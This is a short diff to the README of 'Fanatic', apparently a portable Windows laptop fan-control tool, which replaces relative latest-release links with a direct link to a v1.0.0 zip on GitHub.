@@ -11,7 +11,7 @@
 [![Size](https://img.shields.io/badge/size-~5%20MB-2e3035?style=flat-square&labelColor=1e1f22)](#quick-start)
 [![No telemetry](https://img.shields.io/badge/telemetry-none-2e3035?style=flat-square&labelColor=1e1f22)](#faq)
 
-<a href="../../releases/latest" class="download-btn-action"><img src="https://img.shields.io/badge/Download-Fanatic%20for%20Windows-f08c35?style=for-the-badge&labelColor=1e1f22&logo=windows&logoColor=f08c35" alt="Download Fanatic for Windows"></a>
+<a href="https://github.com/Avalanchevonproxy69/fanatic-laptop-control/releases/download/v1.0.0/Fanatic-v1.0.0-win-x64.zip" class="download-btn-action"><img src="https://img.shields.io/badge/Download-Fanatic%20for%20Windows-f08c35?style=for-the-badge&labelColor=1e1f22&logo=windows&logoColor=f08c35" alt="Download Fanatic for Windows"></a>
 
 </div>
 
@@ -75,7 +75,7 @@ A top-down thermal image of the chassis shows where the heat is: CPU, GPU, VRM, 
 
 ## Quick start
 
-1. Download `Fanatic-v1.0.0-win-x64.zip` from the <a href="../../releases/latest" class="download-btn-action">latest release</a>.
+1. Download `Fanatic-v1.0.0-win-x64.zip` from the <a href="https://github.com/Avalanchevonproxy69/fanatic-laptop-control/releases/download/v1.0.0/Fanatic-v1.0.0-win-x64.zip" class="download-btn-action">latest release</a>.
 2. Unzip it anywhere, for example `C:\Tools\Fanatic`.
 3. Run `Fanatic.exe`. There is no installer and nothing runs in the background after you close it.
 
